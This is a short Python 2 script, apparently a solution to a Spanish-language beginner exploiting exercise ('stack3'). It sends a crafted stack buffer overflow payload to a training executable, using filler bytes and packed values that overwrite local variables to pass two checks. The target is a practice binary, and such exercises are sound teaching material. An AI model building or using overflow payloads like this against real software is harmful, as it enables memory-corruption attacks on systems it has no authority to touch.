#Solucion the Stack3 ejercicio 006 by hdbreaker
#http://ricardonarvaja.info/WEB/EXPLOITING/Nivel%20Basico/006%20stack3.idb/Enunciado.txt
import os
import struct

stdin, stdout = os.popen4("stack3.exe") 
print stdin

#Buffer 68 Bytes de basura
buff = "Macho lo venci" + '\x00' * 54 # => Me sorprende que esto no sea un badchar
#primer if 71727374
var_14 = struct.pack('<I', 0x71727374) # 4 Bytes qrst little endian
var_10 = "\x90" * 4 # => basura para pisar el buffer de var_10 (4 bytes)
#segundo if 1020005
var_C  = struct.pack('<I', 0x1020005)

payload = buff + var_14 + var_10 + var_C  + "\n"
print "[#] Sending Payload"
stdin.write(payload)
print stdout.read(1024)
